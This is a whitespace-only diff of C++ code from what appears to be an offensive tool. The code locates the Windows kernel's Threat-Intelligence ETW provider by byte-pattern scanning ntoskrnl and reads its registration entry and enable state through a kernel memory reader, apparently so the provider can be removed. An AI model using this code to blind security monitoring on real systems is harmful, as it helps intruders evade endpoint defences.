@@ -71,11 +71,11 @@ BOOL ETWTI::EnumerateETW(BOOLEAN REMOVE, wchar_t* whattodo) {
 	EndSearch = (LPVOID) ((DWORD64) GetProcAddress(hNtosBase, "KeInsertQueueApc") + (DWORD64) 0x1000);
 
 	printf("StartSearch %llx\n", StartSearch);
-	 
+
 	while (StartSearch <= EndSearch) {
 		if ((((PBYTE)StartSearch)[0] == patternEtwThreatIntProvRegHandle[0]) && (((PBYTE)StartSearch)[1] == patternEtwThreatIntProvRegHandle[1]) && (((PBYTE)StartSearch)[2] == patternEtwThreatIntProvRegHandle[2]) && (((PBYTE)StartSearch)[3] == patternEtwThreatIntProvRegHandle[3]) && (((PBYTE)StartSearch)[4] == patternEtwThreatIntProvRegHandle[4]) && (((PBYTE)StartSearch)[5] == patternEtwThreatIntProvRegHandle[5])) {
 			distance = *(PDWORD)((DWORD_PTR)StartSearch - 4);
-			pEtwThreat = (LPVOID)((DWORD_PTR)StartSearch + distance); 
+			pEtwThreat = (LPVOID)((DWORD_PTR)StartSearch + distance);
 			break;
 		}
 
@@ -86,7 +86,7 @@ BOOL ETWTI::EnumerateETW(BOOLEAN REMOVE, wchar_t* whattodo) {
 	DWORD Offset = (DWORD)pEtwThreat - (DWORD)hNtosBase;
 
 	printf("Offset %llx\n", Offset);
-	
+
 	LPVOID pEtwRegEntry = NULL;
 	BOOL b = this->objMemHandler->VirtualRead(
 		(DWORD64)this->lpNtosBase + Offset,
@@ -106,7 +106,7 @@ BOOL ETWTI::EnumerateETW(BOOLEAN REMOVE, wchar_t* whattodo) {
 	if (!b) return FALSE;
 
 	printf("[+] nt!_ETW_REG_ENTRY : %llx\n", (PDWORD64)pEtwGuidEntry);
-	
+
 	DWORD isEnabled = 0;
 	b = this->objMemHandler->VirtualRead(
 		(DWORD64)pEtwGuidEntry + ProviderEnableInfo_OFFSET,
